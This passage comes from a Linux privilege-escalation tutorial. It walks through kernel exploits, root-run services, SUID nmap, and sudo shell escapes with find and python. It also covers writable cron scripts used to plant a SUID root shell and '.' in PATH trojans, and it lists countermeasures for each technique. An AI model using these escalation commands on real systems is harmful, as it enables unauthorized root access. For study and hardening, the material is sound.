2. You might get root and then crash the box.
3. The exploit might leave traces/logs that can get you caught.

You should always try the other techniques to get root which we have discussed below before directly jumping to run a local root exploit.

Countermeasures

Keep the kernel patched and updated.
 

2. Exploiting services which are running as root
Exploiting any service which is running as root will give you Root!

The famous EternalBlue and SambaCry exploit, exploited smb service which generally runs as root.
With just one exploit, an attacker can get remote code execution and Local Privilege Escalation as well.
It was heavily used to spread ransomware across of the globe because of it’s deadly combination.

You should always check if web servers, mail servers, database servers, etc. are running as root. Many a times, web admins run these services as root and forget about the security issues it might cause. There could be services which run locally and are not exposed publicly which can also be exploited.

$ netstat -antup – It shows you all the ports which are open and are listening. We can check for services which are running locally if they could be exploited or not.

 

Exploiting a vulnerable version of MySQL which is running as root to get root access

MySQL UDF Dynamic Library exploit lets you execute arbitrary commands from the mysql shell. If mysql is running with root privileges, the commands will be executed as root.

$ ps -aux | grep root – It shows us the services which are running as root.

> We can execute arbitrary commands using MySQL shell which will be executed as root.





One of the biggest mistake web admins do, is to run a webserver with root privilege. A command injection vulnerability on the web application can lead an attacker to root shell. This is a classic example of why you should never run any service as root unless really required.

Binary exploits of a root owned program are far less dangerous than a kernel exploit because even if the service crashes, the host machine will not crash and the services will probably auto restart.

Countermeasures

Never run any service as root unless really required, especially web, database and file servers.
 

3. Exploiting SUID Executables
SUID which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux ping command typically requires root permissions in order to open raw network sockets. By marking the ping program as SUID with the owner as root, ping executes with root privileges anytime a low privilege user executes the program.

> -rwsr-xr-x– The ‘s’ character instead of ‘x’ indicates that the SUID bit is set.



SUID is a feature that, when used properly, actually enhances Linux security. The problem is that administrators may unknowingly introduce dangerous SUID configurations when they install third party applications or make logical configuration changes.

A large number of sysadmins don’t understand as where to set SUID bit and where not. SUID bit should not be set especially on any file editor as an attacker can overwrite any files present on the system.

Exploiting vulnerable SUID executable to get root access

$ find / -perm -u=s -type f 2>/dev/null – It prints the executables which have SUID bit set



$ ls -la /usr/local/bin/nmap – Let’s confirm if nmap has SUID bit set or not.



> Nmap has SUID bit set. A lot of times administrators set the SUID bit to nmap so that it can be used to scan the network efficiently as all the nmap scanning techniques does not work if you don’t run it with root privilege.

> However, there is a functionality in nmap older versions where you can run nmap in an interactive mode which allows you to escape to shell. If nmap has SUID bit set, it will run with root privilege and we can get access to ‘root’ shell through it’s interactive mode.

$ nmap –interactive – runs nmap interactive mode
$ !sh – Lets you escape to the system shell from nmap shell



Countermeasures

SUID bit should not be set to any program which lets you escape to the shell.
You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.
 

4. Exploiting SUDO rights/user
If the attacker can’t directly get root access via any other techniques he might try to compromise any of the users who have SUDO access. Once he has access to any of the sudo users, he can basically execute any commands with root privileges.

Administrators might just allow the users to run a few commands through SUDO and not all of them but even with this configuration, they might introduce vulnerabilities unknowingly which can lead to privilege escalation.

A classic example of this is assigning SUDO rights to the find command so that another user can search for particular files/logs in the system. While the admin might be unaware that the ‘find’ command contains parameters for command execution, an attacker can execute commands with root privilege.

Exploiting misconfigured SUDO rights to get root access

$ sudo -l – Prints the commands which we are allowed to run as SUDO



We can run find, cat and python as SUDO. These all commands will run as root when run with SUDO. If we can somehow escape to the shell through any of these commands, we can get root access.

$ sudo find /home -exec sh -i \; – find command’s exec parameter can be used for arbitrary code execution.



> Never give SUDO rights to any of the programming language compiler, interpreter and editors.

> This technique can also be applied to vi, more, less, perl, ruby, gdb and others.

$ sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’ – spawns a shell



Countermeasures

Do not give sudo rights to any program which lets you escape to the shell.
Never give SUDO rights to vi, more, less, nmap, perl, ruby, python, gdb and others.
 

5. Exploiting badly configured cron jobs
Cron jobs, if not configured properly can be exploited to get root privilege.

1. Any script or binaries in cron jobs which are writable?
2. Can we write over the cron file itself.
3. Is cron.d directory writable?

Cron jobs generally run with root privileges. If we can successfully tamper any script or binary which are defined in the cron jobs then we can execute arbitrary code with root privilege.

Exploiting badly configured cron jobs to get root access

$ ls -la /etc/cron.d – prints cron jobs which are already present in cron.d




$ find / -perm -2 -type f 2>/dev/null – prints world writable files

$ ls -la /usr/local/sbin/cron-logrotate.sh – Let’s confirm if the cron-logrotate.sh is world writable.



> cron-lograte.sh is world writable and it is being run by logrotate cronjob. Any command we write/append in cron-lograte.sh would be executed as ‘root’.

> We write a C file in /tmp directory and compile it.



> The rootme executable will spawn a shell.

$ ls -la rootme – It tells us that it is owned by user ‘SHayslett’



$ echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh – This will change the executable’s owner and group as root. It will also set the SUID bit.

$ ls -la rootme – After 5 minutes, the logrotate cronjob was run and cron-logrotate.sh got execute with root privilege.

$ ./rootme – spawns a root shell.



Countermeasures

Any script or binaries defined in cron jobs should not be writable
cron file should not be writable by anyone except root.
cron.d directory should not be writable by anyone except root.
 

6. Exploiting users with ‘.’ in their PATH
Having ‘.’ in your PATH means that the user is able to execute binaries/scripts from the current directory. To avoid having to enter those two extra characters every time, the user adds ‘.’ to their PATH. This can be an excellent method for an attacker to escalate his/her privilege.

Let’s say Susan is an administrator and she adds ‘.’ in her path so that she doesn’t have to write the 2 characters again.

With ‘.’ in path – program
Without ‘.’ in path – ./program

This happens because Linux first searches for the program in the current directory when ‘.’ is added in the PATH at the beginning and then searches anywhere else.

> Another user ‘rashid’ knew that susan has added ‘.’ in her PATH because she is lazy
> rashid tells susan that ‘ls’ command is not working in his directory
> rashid adds a code in his directory which will change the sudoers file and make him administrator
> rashid stores that code in a file named as ‘ls’ and makes it executable
> susan has root privileges. She comes and executes ‘ls’ command in rashid’s home directory
> Instead of the original ‘ls’ command, the malicious code gets executed with root access

> Inside a file saved as ‘ls’, a code has been added which will print “Hello world”



$ PATH=.:${PATH} – adds ‘.’ in the PATH variable



$ ls – executed ./ls file instead of running list comamnd.

> Now, if a root user executes the code with root privilege, we can achieve arbitrary code execution with root privilege.
